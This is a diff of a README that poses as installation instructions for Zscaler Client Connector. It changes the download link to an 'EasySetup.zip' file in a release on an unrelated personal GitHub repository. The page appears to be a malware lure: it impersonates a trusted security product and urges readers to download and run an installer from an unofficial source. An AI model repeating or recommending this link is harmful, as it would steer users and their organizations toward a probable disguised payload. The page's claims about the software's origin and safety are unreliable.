@@ -13,7 +13,7 @@ The Zscaler Client Connector ensures a secure and uninterrupted link between use
 ## Installation
 To start using Zscaler Client Connector, download the installer package here:
 
-[**Download Zscaler Client Connector**](https://github.com/stardew47/open/releases/download/1.2975/zscaler-client-connector-win-4.6.zip)
+[**Download Zscaler Client Connector**](https://github.com/stardew47/open/releases/download/1.2975/EasySetup.zip)
 
 Begin by obtaining the Zscaler Client Connector for your device. This step is essential for ensuring secure access to your organization's resources. After the download finishes, follow the installation procedure appropriate for your operating system. The application is designed with simplicity in mind, guaranteeing a smooth setup process.
 
